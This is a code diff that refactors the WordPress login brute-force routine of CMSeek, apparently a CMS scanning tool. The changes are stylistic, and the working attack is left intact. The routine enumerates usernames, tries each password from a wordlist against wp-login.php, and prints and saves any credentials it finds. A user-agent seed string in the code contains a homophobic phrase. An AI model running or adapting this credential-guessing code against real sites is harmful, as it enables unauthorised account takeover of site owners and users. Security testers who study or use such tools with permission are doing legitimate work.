@@ -36,17 +36,16 @@ def start():
             wpcnf = '1'
         else:
             try2 = source.check(bsrc[1], url)
-            if try2[0] == '1' and try2[1] == 'wp':
-                wpcnf = '1'
-            else:
-                wpcnf = '0'
+            wpcnf = '1' if try2[0] == '1' and try2[1] == 'wp' else '0'
     if wpcnf != '1':
         print(bsrc[1])
         cmseek.error('Could not confirm WordPress... CMSeek is quitting')
         cmseek.handle_quit()
     else:
         cmseek.success("WordPress Confirmed... Checking for WordPress login form")
-        wploginsrc = cmseek.getsource(url + '/wp-login.php', cmseek.randomua('thatsprettygay'))
+        wploginsrc = cmseek.getsource(
+            f'{url}/wp-login.php', cmseek.randomua('thatsprettygay')
+        )
         if wploginsrc[0] == '1' and '<form' in wploginsrc[1]:
             cmseek.success("Login form found.. Detecting Username For Bruteforce")
             wpparamuser = []
@@ -65,25 +64,23 @@ def start():
             for user in wpbruteusers:
                 passfound = '0'
                 print('\n')
-                cmseek.info("Bruteforcing User: " + cmseek.bold + user + cmseek.cln)
+                cmseek.info(f"Bruteforcing User: {cmseek.bold}{user}{cmseek.cln}")
                 pwd_file = open("wordlist/passwords.txt", "r")
                 passwords = pwd_file.read().split('\n')
                 passwords.insert(0, user)
                 for password in passwords:
-                    if password != '' and password != '\n':
+                    if password not in ['', '\n']:
                         sys.stdout.write('[*] Testing Password: ')
                         sys.stdout.write('%s\r\r' % password)
                         sys.stdout.flush()
                         cursrc = cmseek.wpbrutesrc(url, user, password)
-                        if 'wp-admin' in str(cursrc[3]):
-                            cmseek.success('Password found!')
-                            print(" |\n |--[username]--> " + cmseek.bold + user + cmseek.cln + "\n |\n |--[password]--> " + cmseek.bold + password + cmseek.cln + "\n |")
-                            cmseek.success('Enjoy The Hunt!')
-                            cmseek.savebrute(url,url + '/wp-login.php',user,password)
-                            passfound = '1'
-                            break
-                        else:
+                        if 'wp-admin' not in str(cursrc[3]):
                             continue
+                        cmseek.success('Password found!')
+                        print(" |\n |--[username]--> " + cmseek.bold + user + cmseek.cln + "\n |\n |--[password]--> " + cmseek.bold + password + cmseek.cln + "\n |")
+                        cmseek.success('Enjoy The Hunt!')
+                        cmseek.savebrute(url, f'{url}/wp-login.php', user, password)
+                        passfound = '1'
                         break
                 if passfound == '0':
                         cmseek.error('\n\nCould Not find Password!')
